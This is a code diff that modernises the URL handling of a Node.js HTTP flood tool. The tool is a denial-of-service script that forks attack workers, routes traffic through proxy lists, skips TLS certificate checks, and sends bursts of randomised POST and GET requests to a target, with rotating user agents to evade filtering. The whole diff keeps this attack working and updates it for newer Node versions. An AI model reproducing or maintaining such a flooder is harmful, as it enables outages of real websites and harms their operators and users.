@@ -5,7 +5,7 @@ process.on('unhandledRejection', function(er) {
 require('events').EventEmitter.defaultMaxListeners = 0;
 const fs = require('fs');
 const randstr = require('randomstring')
-const url = require('url');
+const { URL } = require('url');
 
 var path = require("path");
 const cluster = require('cluster');
@@ -69,7 +69,7 @@ if (POSTDATA !== undefined){
     POSTDATA = ""
 }
 
-if (cluster.isMaster){
+if (cluster.isPrimary){
     for (let i = 0; i < process.argv[6]; i++){
         cluster.fork();
         console.log(`(!) Threads ${i} Using Attacking`);
@@ -88,7 +88,11 @@ var rate = 100;
 var target_url = process.argv[3];
 const target = target_url.split('""')[0];
 
-var parsed = url.parse(target);
+var parsed = new URL(target);
+// Modern URL API uyumluluğu için path ve hostname helper'ları
+const targetPath = (parsed.pathname || '/') + (parsed.search || '');
+const targetHost = parsed.hostname;
+const targetHostWithPort = parsed.host || (parsed.hostname + ':' + (parsed.port || '443'));
 process.setMaxListeners(0);
 
 const cplist = [
@@ -129,7 +133,7 @@ function startflood(){
                     port: proxy[1],
                     ciphers: cipper,
                     method: 'CONNECT',
-                    path: parsed.host + ":443"
+                    path: targetHostWithPort
                 }, (err) => {
                     req.end();
                     return;
@@ -138,16 +142,16 @@ function startflood(){
                 req.on('connect', function (res, socket, head) { 
                         //open raw request
                         var tlsConnection = tls.connect({
-                            host: parsed.host,
+                            host: targetHost,
                             ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                             secureProtocol: 'TLSv1_2_method',
-                            servername: parsed.host,
+                            servername: targetHost,
                             secure: true,
                             rejectUnauthorized: false,
                             socket: socket
                         }, function () {
                             for (let j = 0; j < rate; j++) {
-                                tlsConnection.write("POST" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
+                                tlsConnection.write("POST" + ' ' + `${targetPath.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.1\r\nHost: ' + targetHostWithPort + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                             }
                             // tlsConnection.end();
                             // tlsConnection.destroy();
@@ -181,7 +185,7 @@ function startflood(){
                     port: proxy[1],
                     ciphers: cipper,
                     method: 'CONNECT',
-                    path: parsed.host + ":443"
+                    path: targetHostWithPort
                 }, (err) => {
                     req.end();
                     return;
@@ -190,16 +194,16 @@ function startflood(){
                 req.on('connect', function (res, socket, head) { 
                         //open raw request
                         var tlsConnection = tls.connect({
-                            host: parsed.host,
+                            host: targetHost,
                             ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                             secureProtocol: 'TLSv1_2_method',
-                            servername: parsed.host,
+                            servername: targetHost,
                             secure: true,
                             rejectUnauthorized: false,
                             socket: socket
                         }, function () {
                             for (let j = 0; j < rate; j++) {
-                                tlsConnection.write("POST" + ' ' + parsed.path.replace("%RAND%",ra()) + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
+                                tlsConnection.write("POST" + ' ' + targetPath.replace("%RAND%",ra()) + ' HTTP/1.1\r\nHost: ' + targetHostWithPort + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                             }
                             // tlsConnection.end();
                             // tlsConnection.destroy();
@@ -235,7 +239,7 @@ function startflood(){
                     port: proxy[1],
                     ciphers: cipper,
                     method: 'CONNECT',
-                    path: parsed.host + ":443"
+                    path: targetHostWithPort
                 }, (err) => {
                     req.end();
                     return;
@@ -244,16 +248,16 @@ function startflood(){
                 req.on('connect', function (res, socket, head) { 
                         //open raw request
                         var tlsConnection = tls.connect({
-                            host: parsed.host,
+                            host: targetHost,
                             ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                             secureProtocol: 'TLSv1_2_method',
-                            servername: parsed.host,
+                            servername: targetHost,
                             secure: true,
                             rejectUnauthorized: false,
                             socket: socket
                         }, function () {
                             for (let j = 0; j < rate; j++) {
-                                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
+                                tlsConnection.write("GET" + ' ' + `${targetPath.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' HTTP/1.1\r\nHost: ' + targetHostWithPort + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                             }
                             // tlsConnection.end();
                             // tlsConnection.destroy();
@@ -283,7 +287,7 @@ function startflood(){
                     port: proxy[1],
                     ciphers: cipper,
                     method: 'CONNECT',
-                    path: parsed.host + ":443"
+                    path: targetHostWithPort
                 }, (err) => {
                     req.end();
                     return;
@@ -292,16 +296,16 @@ function startflood(){
                 req.on('connect', function (res, socket, head) { 
                         //open raw request
                         var tlsConnection = tls.connect({
-                            host: parsed.host,
+                            host: targetHost,
                             ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                             secureProtocol: 'TLSv1_2_method',
-                            servername: parsed.host,
+                            servername: targetHost,
                             secure: true,
                             rejectUnauthorized: false,
                             socket: socket
                         }, function () {
                             for (let j = 0; j < rate; j++) {
-                                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%",ra())}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
+                                tlsConnection.write("GET" + ' ' + `${targetPath.replace("%RAND%",ra())}` + ' HTTP/1.1\r\nHost: ' + targetHostWithPort + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                             }
                             // tlsConnection.end();
                             // tlsConnection.destroy();
